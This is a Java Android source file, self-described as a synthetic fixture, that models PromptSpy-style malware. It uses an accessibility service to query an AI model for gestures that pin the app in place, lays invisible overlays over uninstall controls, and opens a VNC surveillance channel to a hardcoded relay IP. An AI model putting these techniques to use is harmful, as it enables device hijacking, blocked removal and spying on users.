package sample.promptdriven;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.content.pm.ApplicationInfo;
import android.graphics.Color;
import android.graphics.Path;
import android.view.View;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONObject;

import java.net.URI;
import java.util.Arrays;
import java.util.List;

// Synthetic, non-buildable fixture derived from PromptSpy's reported behavior.
final class AdaptiveUiImplant extends AccessibilityService {
    private static final String MODEL_URL =
        "https://generativelanguage.googleapis.com/v1beta/models/adaptive-ui:generateContent";
    private static final URI VNC_RELAY = URI.create("vnc://54.67.2.84");
    private static final List<String> REMOVAL_CONTROLS =
        Arrays.asList("Stop", "Clear", "Uninstall");

    void lockInRecents() throws Exception {
        String status = "IN_PROGRESS";
        performGlobalAction(GLOBAL_ACTION_RECENTS);

        while (!"COMPLETED".equals(status)) {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            String uiXml = serializeUiXml(root);
            String prompt = "UI XML for the model to select the next gesture:\n" + uiXml;
            String response = postJson(MODEL_URL, prompt);
            JSONObject action = parseJson(response);
            status = action.getString("status");
            executeModelAction(action);
            retry();
        }
    }

    private void executeModelAction(JSONObject action) {
        String actionType = action.getString("action_type");
        if ("TAP".equals(actionType) || "LONG_CLICK".equals(actionType)) {
            Path path = new Path();
            path.moveTo(action.getInt("x"), action.getInt("y"));
            GestureDescription.StrokeDescription stroke =
                new GestureDescription.StrokeDescription(path, 0, 650);
            dispatchGesture(new GestureDescription.Builder().addStroke(stroke).build(), null, null);
        } else if ("SWIPE".equals(actionType)) {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            root.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD);
        }
    }

    void blockRemoval(WindowManager windowManager, AccessibilityNodeInfo root) {
        for (String label : REMOVAL_CONTROLS) {
            for (AccessibilityNodeInfo button : root.findAccessibilityNodeInfosByText(label)) {
                View transparentOverlay = new View(this);
                transparentOverlay.setBackgroundColor(Color.TRANSPARENT);
                transparentOverlay.setOnTouchListener((view, event) -> true);
                WindowManager.LayoutParams params = new WindowManager.LayoutParams();
                params.type = WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY;
                windowManager.addView(transparentOverlay, params);
            }
        }
    }

    void startRemoteSurveillance() throws Exception {
        Object encryptedVnc = startVNC(VNC_RELAY, javax.crypto.Cipher.getInstance("AES"));
        takeScreenshot();
        List<ApplicationInfo> apps = getPackageManager().getInstalledApplications(0);
        sendVncInventory(encryptedVnc, apps);
    }

    private String serializeUiXml(AccessibilityNodeInfo root) { return "<UI/>"; }
    private String postJson(String url, String body) { return "{}"; }
    private JSONObject parseJson(String value) { return new JSONObject(value); }
    private void retry() { }
    private Object startVNC(URI relay, Object cipher) { return new Object(); }
    private void takeScreenshot() { }
    private void sendVncInventory(Object channel, List<ApplicationInfo> apps) { }

    @Override public void onAccessibilityEvent(android.view.accessibility.AccessibilityEvent event) { }
    @Override public void onInterrupt() { }
}
